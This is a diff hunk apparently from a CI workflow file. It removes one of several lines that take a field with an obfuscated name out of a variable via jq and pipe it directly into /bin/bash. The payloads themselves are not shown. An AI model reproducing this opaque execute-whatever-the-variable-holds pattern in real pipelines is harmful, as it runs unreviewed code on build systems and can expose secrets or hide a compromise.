@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$eq4" | jq -r .fwjld30908 | /bin/bash
           echo $ocwnk9 | jq -r .twp46280 | /bin/bash
           echo $rdqr57 | jq -r .gmag0022 | /bin/bash
-          printf '%s' "$ghmd78" | jq -r .lezuz05728 | /bin/bash
           echo $fdzen35 | jq -r .i0760 | /bin/bash
 
       - name: Persist data
